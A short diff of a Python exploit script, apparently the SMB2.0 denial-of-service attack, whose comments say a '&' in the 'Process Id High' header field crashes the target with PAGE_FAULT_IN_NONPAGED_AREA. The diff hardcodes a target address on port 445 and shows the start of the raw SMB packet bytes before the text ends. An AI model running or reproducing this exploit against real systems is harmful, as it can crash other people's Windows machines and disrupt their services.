@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# When SMB2.0 recieve a "&" char in the "Process Id High" 
+# When SMB2.0 recieve a "&" char in the "Process Id High"
 # SMB header field it dies with a
 # PAGE_FAULT_IN_NONPAGED_AREA
 
@@ -8,6 +8,7 @@ from socket import socket
 from time import sleep
 
 host = sys.argv[1], 445
+host = "192.168.33.14", 445
 buff = (
 "\x00\x00\x00\x90" # Begin SMB header: Session message
 "\xff\x53\x4d\x42" # Server Component: SMB
